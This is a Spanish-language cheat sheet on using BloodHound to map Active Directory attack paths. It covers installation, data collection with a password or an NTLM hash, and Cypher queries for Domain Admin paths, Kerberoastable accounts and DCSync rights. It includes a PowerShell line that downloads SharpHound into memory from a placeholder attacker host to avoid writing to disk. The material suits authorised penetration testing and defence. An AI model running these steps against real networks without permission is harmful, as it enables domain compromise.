# BloodHound

La herramienta más importante para analizar AD. Visualiza relaciones y permisos en forma de grafo y encuentra rutas de ataque automáticamente.

#### Instalación

```bash
# BloodHound Community Edition (CE) con Docker
git clone https://github.com/SpecterOps/BloodHound
cd BloodHound
cp examples/docker-compose/docker-compose.yml .
docker compose up -d

# Acceder en: http://localhost:8080
# Credenciales por defecto: admin / (generadas al iniciar, ver logs)
docker compose logs | grep "Initial Password"

# BloodHound legacy (versión 4.x)
apt install bloodhound
neo4j console &        # Iniciar base de datos
bloodhound &           # Iniciar app
```

#### Recolección de datos

```bash
# BloodHound.py (desde Linux — recolector remoto)
pip3 install bloodhound
bloodhound-python -u usuario -p contraseña -d empresa.local -ns 10.10.10.10 -c all
bloodhound-python -u usuario -p contraseña -d empresa.local -ns 10.10.10.10 -c All,LoggedOn

# Con hash NTLM
bloodhound-python -u usuario -H NTHASH -d empresa.local -ns 10.10.10.10 -c all

# SharpHound (desde Windows — más completo)
.\SharpHound.exe -c All --zipfilename output.zip
.\SharpHound.exe -c All,GPOLocalGroup --stealth
.\SharpHound.exe -c All --ldapusername usuario --ldappassword contraseña

# SharpHound en memoria (evitar escritura en disco)
IEX (New-Object Net.WebClient).DownloadString('http://attacker/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All -ZipFilename output.zip
```

#### Queries Cypher más útiles

```cypher
// Todos los Domain Admins
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@EMPRESA.LOCAL"}) RETURN u

// Ruta más corta a Domain Admins desde un usuario
MATCH p=shortestPath((u:User {name:"USUARIO@EMPRESA.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@EMPRESA.LOCAL"})) RETURN p

// Usuarios con AS-REP Roastable
MATCH (u:User {dontreqpreauth:true}) RETURN u

// Usuarios Kerberoastable
MATCH (u:User {hasspn:true}) RETURN u

// Equipos donde Domain Users son admins locales
MATCH p=(g:Group {name:"DOMAIN USERS@EMPRESA.LOCAL"})-[:AdminTo]->(c:Computer) RETURN p

// Cuentas con privilegios de DCSync
MATCH (n)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain) RETURN n

// Permisos sobre Domain Admins
MATCH p=(n)-[:MemberOf|GenericAll|GenericWrite|WriteOwner|WriteDACL|AddMember]->(g:Group {name:"DOMAIN ADMINS@EMPRESA.LOCAL"}) RETURN p

// Computadoras con Unconstrained Delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c

// Sesiones activas de Domain Admins
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@EMPRESA.LOCAL"})
MATCH (u)-[:HasSession]->(c:Computer) RETURN u, c
```
